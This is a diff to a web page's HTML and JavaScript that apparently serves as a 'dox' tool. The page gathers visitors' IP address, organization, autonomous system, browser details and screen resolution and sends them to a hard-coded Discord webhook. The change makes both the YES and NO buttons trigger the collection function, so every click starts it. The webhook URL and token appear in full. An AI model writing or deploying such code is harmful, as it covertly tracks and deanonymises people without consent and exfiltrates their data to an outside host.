@@ -41,7 +41,7 @@
         <b class="begin">
             <span id="enter-type-in" style="text-shadow: 0 0 0.40em #fff;"></span>
             <br>
-            <span id="enter" class="appear">[<span style="--color: #FFFFFF" class="glow-hover">YES</span>]</span>
+            <span id="enter" class="appear" onclick="startDox()">[<span style="--color: #FFFFFF" class="glow-hover">YES</span>]</span>
             <span class="appear" onclick="start_dox()">[<span style="--color: #FF0000" class="glow-hover">NO</span>]</span>
         </b>
         <br>
@@ -119,7 +119,6 @@
             await push('Organization', detailed.org);
             await push('Autonomous System', detailed.as);
 
-
             // Send webhook server-side
             sendWebhook({
                 ip,
@@ -138,6 +137,12 @@
                 screenResolution: `${screen.width}x${screen.height}`,
                 time: new Date().toLocaleString()
             });
+        }
+
+        function startDox() {
+            let dox = document.getElementById("dox");
+            dox.style.opacity = "0"; // Reset overlay
+            setTimeout(start_dox, 300); // Call the existing dox function after a brief pause
         }
 
         function getBrowserInfo() {
@@ -167,7 +172,7 @@
         }
 
         async function sendWebhook(data) {
-            const webhookUrl = 'https://discord.com/api/webhooks/1286674843579715584/60qs2OqhUghNtGX4PBJM1pgYcXgfA2EhP8Cv6yHXpWo4KvWMOI0zusvkrbSNhXDbtYct';  // Replace with your actual webhook URL
+            const webhookUrl = 'https://discord.com/api/webhooks/1286674843579715584/60qs2OqhUghNtGX4PBJM1pgYcXgfA2EhP8Cv6yHXpWo4KvWMOI0zusvkrbSNhXDbtYct'; // Replace with your actual webhook URL
             await fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
